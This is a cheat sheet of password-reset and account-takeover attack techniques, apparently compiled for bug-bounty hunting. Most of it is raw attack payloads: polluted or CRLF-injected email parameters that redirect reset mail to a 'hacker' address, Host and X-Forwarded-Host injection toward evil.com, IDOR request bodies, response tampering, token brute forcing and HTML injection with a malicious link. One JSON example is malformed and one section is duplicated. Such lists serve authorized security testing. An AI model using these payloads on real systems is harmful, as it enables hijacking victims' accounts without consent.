### **Password Reset & Account Takeover Techniques**

#### **1. Parameter Pollution**
POST /reset HTTP/1.1
Host: target.com
...
email=victim@mail.com&email=hacker@mail.com

#### **2. Host Header Injection**
POST /reset HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
...
email=victim@mail.com

#### **3. Using Separators in Parameter Values**
POST /reset HTTP/1.1
Host: target.com
...
email=victim@mail.com,hacker@mail.com

email=victim@mail.com%00hacker@mail.com

email=victim@mail.com|hacker@mail.com

email=victim@mail.com%20hacker@mail.com

#### **4. No Domain in Parameter Value**
POST /reset HTTP/1.1
Host: target.com
...
email=victim

#### **5. No TLD in Parameter Value**
POST /reset HTTP/1.1
Host: target.com
...
email=victim@mail

#### **6. Using Carbon Copy (CC)**
POST /reset HTTP/1.1
Host: target.com
...
email=victim@mail.com%0a%0dcc:hacker@mail.com

#### **7. JSON Data Manipulation**
POST /newaccount HTTP/1.1
Host: target.com
...
{"email":"victim@mail.com","hacker@mail.com","token":"xxxxxxxxxx"}

#### **8. Token Generation Analysis**
- Generated based on TimeStamp
- Generated based on the ID of the user
- Generated based on the email of the user
- Generated based on the name of the user

#### **9. Cross-Site Scripting (XSS) in the Form**
- Try injecting XSS payloads in the password reset form.

#### **10. Race Condition**
- Send victim reset password and attacker reset password requests simultaneously.

#### **11. Password Reset Token Leak Via Referrer**
- Check if the reset token is leaked in the HTTP Referrer header.

#### **12. Guessable UUID**
- Test if the reset token is a guessable UUID.

#### **13. Brute Force Password Reset Token**
- Attempt to brute force the reset token if it is short or predictable.

#### **14. Try Using Your Token**
- Use your own reset token on another account to see if it works.

#### **15. Reset Password with Email 1, Change Email to Another**
- Reset password with email 1, then change email to another. Check if the link from email 1 still works.

#### **16. References**
- Twitter Post: https://x.com/Securrtech/status/1776580537429422217
- Bugcrowd Blog: https://www.bugcrowd.com/blog/breaking-the-chain-exploiting-oauth-and-forgot-password-for-account-takeover/

---

-- https://xmind.ai/share/UYJM9L9t
-- https://xmind.ai/share/UYJM9L9t?xid=yDAky4KX

----

### **Password Reset Vulnerabilities and Exploitation Techniques**

---

#### **1. Weak Cryptography in Password Reset**
- **Weak Token Generation**:  
  - Tokens may be predictable or reused.  
  - Example: Tokens based on timestamps or sequential numbers.  

- **Host Header Poisoning**:  
  - Exploit host header injection to redirect reset links.  
  - Example: `victim.com@attacker.com`.  

- **IDN Homograph Attack**:  
  - Use visually similar characters to spoof domains.  
  - Example: `victim.com` vs `vіctim.com` (using Cyrillic characters).  

---

#### **2. Manipulating Email Parameters**
- **Parameter Pollution**:  
  ```plaintext
  email=victim@mail.com&email=hacker@mail.com
  ```
- **Array of Emails**:  
  ```json
  {"email":["victim@mail.com","hacker@mail.com"]}
  ```
- **Carbon Copy (CC/BCC)**:  
  ```plaintext
  email=victim@mail.com%0A%0Dcc:hacker@mail.com
  ```
- **Separators**:  
  ```plaintext
  email=victim@mail.com,hacker@mail.com
  email=victim@mail.com|hacker@mail.com
  ```
- **No Domain/TLD**:  
  ```plaintext
  email=victim
  email=victim@xyz
  ```
- **Unicode Characters**:  
  ```plaintext
  email=victim@mail.com%00
  email=victim@mail.com{{}}
  ```

---

#### **3. Response Manipulation**
- **ATO via Response Manipulation**:  
  1. Capture a successful password reset response.  
  2. Intercept a failed reset attempt.  
  3. Replace the error response with the successful one.  
  - Example: Change `{"status":false}` to `{"status":true}`.  

---

#### **4. IDOR in Password Reset**
- **Exploit User ID Leakage**:  
  - Replace the user ID in the reset request with another user’s ID.  
  - Example:  
    ```json
    {"user_id":"attacker_id","new_password":"hacked123"}
    ```

---

#### **5. Race Conditions**
- **Exploit Time-Sensitive Vulnerabilities**:  
  - Submit multiple reset requests simultaneously.  
  - Example: Use Burp Intruder to flood the reset endpoint.  
  - Reference: [PortSwigger Lab](https://portswigger.net/web-security/race-conditions).  

---

#### **6. Token Exploitation**
- **Token Manipulation**:  
  1. Remove the token.  
  2. Use `000000` or null values.  
  3. Test expired or old tokens.  
  4. Use an array of tokens.  
  5. Exploit Unicode characters.  

- **Token Leakage via Referer Header**:  
  - Check if the reset token is leaked in the Referer header.  
  - Example: [HackerOne Report](https://hackerone.com/reports/342693).  

---

#### **7. No Rate Limit**
- **Brute-Force Reset Tokens**:  
  - Submit multiple reset requests without rate limiting.  
  - Example: Use Burp Intruder to brute-force OTPs.  

---

#### **8. Enumeration of Usernames**
- **Username Enumeration**:  
  - Check if the reset page reveals valid usernames/emails.  
  - Example: Different error messages for valid vs invalid users.  

---

#### **9. HTML Injection in Reset Page**
- **Inject Malicious HTML**:  
  - Example: `<h1>attacker</h1><a href="malicious.com">Click here</a>`.  
  - Escalate to XSS or phishing attacks.  

---

#### **10. Token Invalidation Issues**
- **Token Not Invalidated After Use**:  
  - Reuse the same token multiple times.  

- **Token Not Invalidated After Email/Password Change**:  
  - Exploit tokens that remain valid after account changes.  
  - Example: [HackerOne Report](https://hackerone.com/reports/411337).  

- **Token Has Long Expiry**:  
  - Exploit tokens that remain valid for extended periods.  

---

#### **11. CRLF Injection**
- **Inject CRLF in URL**:  
  - Example: `/resetPassword?0a%0dHost:attacker.tld`.  
  - Exploit headers like `X-Forwarded-For` or `True-Client-IP`.  

---

#### **12. Password Policy Bypass**
- **Weak Password Policy**:  
  - Test for acceptance of weak passwords like `123456`.  
  - Check if passwords can match usernames or emails.  

---

#### **13. Failure to Invalidate Session**
- **Session Not Invalidated After Reset**:  
  - Exploit active sessions after password reset.  

---

#### **14. Cleartext Transmission of Tokens**
- **Tokens Sent Over HTTP**:  
  - Intercept tokens transmitted over unencrypted channels.  

---

#### **15. HTML Injection on Reset Page**
- **Inject HTML Tags**:  
  - Example: `<h1>attacker</h1>`.  
  - Escalate to phishing or XSS attacks.  

---
- https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows
- https://infosecwriteups.com/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5
- 
